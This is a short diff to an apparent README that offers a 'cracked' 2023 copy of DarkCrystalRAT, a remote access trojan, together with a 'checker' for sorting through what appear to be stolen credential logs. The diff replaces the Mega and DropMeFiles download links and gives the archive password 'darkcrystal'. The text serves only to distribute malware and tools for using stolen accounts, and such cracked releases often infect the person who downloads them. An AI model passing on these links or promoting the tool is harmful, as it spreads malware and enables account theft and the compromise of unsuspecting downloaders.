@@ -4,10 +4,10 @@ File already patched, licenses removed.
 
 In the checker you select the path to your logs and you can select the services you need to check.
 
-[Download CRACKED 2023 DarkCrystalRAT - click - Mega](https://mega.nz/file/kDlhSQ6Y#zK8afcmoxhf2D89lp7HN4oOiU9SpQUtbR6NnOA3IyNc)
+[Download CRACKED 2023 DarkCrystalRAT - click - Mega](https://mega.nz/file/xHkAVTIK#SMbl1c1UPvUYYT3QpTc4C07RMw4W9MFLpGQkZV_MJRw)
 Password: darkcrystal
 
-[Download CRACKED 2023 DarkCrystalRAT - click - DropMeFiles](https://dropmefiles.com.ua/ua/cALkHwW)
+[Download CRACKED 2023 DarkCrystalRAT - click - DropMeFiles](https://dropmefiles.com.ua/ua/CLDxBM)
 Password: darkcrystal
 
 ![image](https://i.imgur.com/OdTunjD.png)
